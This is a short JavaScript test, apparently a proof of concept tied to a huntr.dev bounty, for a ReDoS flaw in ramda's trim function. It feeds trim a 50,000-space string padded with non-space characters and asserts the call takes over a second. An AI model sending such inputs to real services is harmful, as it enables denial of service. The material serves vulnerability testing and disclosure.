//https://www.huntr.dev/bounties/51dfe927-1bf1-4b36-91ca-2197337e663a/
test("ReDos in ramda", () => {
  const { trim } = require("ramda");
  const measureTime = require("../utils").measureTime;
  let attack_str = "a" + " ".repeat(33000) + "a";

  let t = measureTime(function () {
    trim(build_blank(50000));
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});

function build_blank(n) {
  var ret = "1";
  for (var i = 0; i < n; i++) {
    ret += " ";
  }

  return ret + "1";
}
